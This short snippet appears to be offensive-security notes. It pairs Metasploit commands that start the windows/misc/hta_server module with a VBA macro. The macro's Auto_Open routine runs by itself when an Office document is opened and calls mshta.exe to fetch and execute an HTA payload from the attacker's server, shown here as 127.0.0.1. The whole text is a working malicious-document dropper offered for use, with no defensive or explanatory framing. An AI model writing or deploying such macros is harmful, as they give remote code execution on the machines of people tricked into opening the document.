# msfconsole
# use windows/misc/hta_server
# settings

Sub HelloWorld()
	PID = Shell("mshta.exe http://127.0.0.1/letters.hta")
End Sub

Sub Auto_Open()
	HelloWorld
End Sub
